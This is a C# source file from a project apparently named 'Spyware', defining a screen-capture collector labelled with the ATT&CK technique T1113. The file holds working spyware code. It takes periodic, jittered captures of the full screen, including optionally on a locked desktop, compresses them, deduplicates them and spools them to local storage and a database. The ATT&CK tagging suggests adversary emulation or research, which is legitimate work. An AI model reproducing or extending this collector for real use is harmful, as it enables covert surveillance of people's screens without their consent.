using System.Security.Cryptography;
using System.Windows.Forms;
using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Imaging;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Scheduling;
using Spyware.Storage;

namespace Spyware.Collectors.Screenshot;

/// <summary>T1113 — Screen Capture.</summary>
public sealed class ScreenCaptureService : ICollector
{
    private readonly AgentPaths _paths;
    private readonly LocalEventRepository _repository;
    private readonly SpoolManager _spool;
    private readonly ScreenshotSection _config;
    private readonly ILog _log;
    private PeriodicTask? _task;
    private string? _lastHash;
    private readonly object _hashGate = new();

    public string Name => "screenshot";

    public int CapturedCount { get; private set; }
    public int SkippedDuplicateCount { get; private set; }

    public ScreenCaptureService(AgentPaths paths, LocalEventRepository repository, SpoolManager spool,
                                ScreenshotSection config, ILog log)
    {
        _paths = paths;
        _repository = repository;
        _spool = spool;
        _config = config;
        _log = log;
    }

    public void Start()
    {
        if (!_config.Enabled)
        {
            _log.Info("Collector de capturas deshabilitado.");
            return;
        }

        _task = new PeriodicTask(
            Name,
            () => CaptureOnce(),
            TimeSpan.FromSeconds(Math.Max(5, _config.IntervalSeconds)),
            _config.JitterSeconds,
            _log);

        _task.Start(runImmediately: true);
    }

    public void Stop()
    {
        _task?.Dispose();
        _task = null;
    }

    public ScreenshotEvent? CaptureOnce()
    {
        bool locked = DesktopState.IsSecureOrLocked(_log);
        if (locked && !_config.CaptureOnLockedDesktop)
        {
            _log.Debug("Escritorio seguro/bloqueado: se omite la captura (limitación conocida).");
            return null;
        }

        System.Drawing.Rectangle bounds = SystemInformation.VirtualScreen;
        if (bounds.Width <= 0 || bounds.Height <= 0)
        {
            _log.Warn($"VirtualScreen vacío ({bounds}); sesión sin escritorio visible.");
            return null;
        }

        byte[] jpeg;
        int width;
        int height;

        try
        {
            using var full = new System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            using (var graphics = System.Drawing.Graphics.FromImage(full))
            {
                graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, full.Size, System.Drawing.CopyPixelOperation.SourceCopy);
            }

            using var resized = ImageCompressor.ResizeToMax(full, _config.MaxWidth, _config.MaxHeight);
            width = resized.Width;
            height = resized.Height;
            jpeg = ImageCompressor.ToJpeg(resized, _config.JpegQuality);
        }
        catch (Exception ex)
        {
            _log.Error("CopyFromScreen falló (escritorio protegido o RDP sin redirección).", ex);
            return null;
        }

        string hash = Convert.ToHexString(SHA256.HashData(jpeg)).ToLowerInvariant();
        lock (_hashGate)
        {
            if (_config.SkipDuplicates && hash == _lastHash)
            {
                SkippedDuplicateCount++;
                _log.Debug($"Captura idéntica ({hash[..12]}…): no se almacena.");
                return null;
            }

            _lastHash = hash;
        }

        DateTime now = DateTime.UtcNow;
        string path = _spool.SaveScreenshot(jpeg, now);

        var evt = new ScreenshotEvent
        {
            TimestampUtc = now,
            Path = path,
            Width = width,
            Height = height,
            Hash = hash,
            Bytes = jpeg.Length,
            DisplayCount = Screen.AllScreens.Length,
            DesktopLocked = locked
        };

        evt = evt with { DatabaseId = _repository.InsertScreenshot(evt) };
        CapturedCount++;

        _log.Info($"Captura guardada {width}x{height} ({jpeg.Length / 1024} KB) -> {System.IO.Path.GetFileName(path)}");
        return evt;
    }
}
